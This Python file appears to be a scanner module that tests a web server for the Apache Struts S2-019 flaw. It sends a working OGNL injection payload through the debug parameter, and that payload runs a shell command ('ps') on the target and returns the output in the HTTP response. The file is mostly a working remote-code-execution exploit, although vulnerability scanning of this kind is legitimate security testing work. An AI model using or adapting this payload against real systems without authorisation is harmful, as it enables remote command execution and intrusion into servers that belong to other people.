# -*- encoding: utf-8 -*-
'''
@File : s2_019.py
@Time : 2019/08/03 22:02:33
@Author : JE2Se 
@Version : 1.0
@Contact : admin@je2se.com
@WebSite : https://www.je2se.com
'''


import requests
from lib import *
import sys

def s2_019(url):
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    exp = '''?debug=command&expression=#a=(new java.lang.ProcessBuilder('ps')).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#out=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),#out.getWriter().println(new java.lang.String(#e)), #d.read(#e),#out.getWriter().println(new java.lang.String(#e)) , #d.read(#e),#out.getWriter().println(new java.lang.String(#e)) ,#out.getWriter().flush(),#out.getWriter().close()'''
    url += exp
    try:
        resp = requests.get(url,headers=headers, timeout=10)
        if "PID" in resp.text:
            print(Vcolors.RED +"存在S2-019漏洞~"+ Vcolors.ENDC)
        else:
            print(Vcolors.OKGREEN +"不存在S2-019漏洞~"+ Vcolors.ENDC)
    except:
        print(Vcolors.OKGREEN +"不存在S2-019漏洞~"+ Vcolors.ENDC)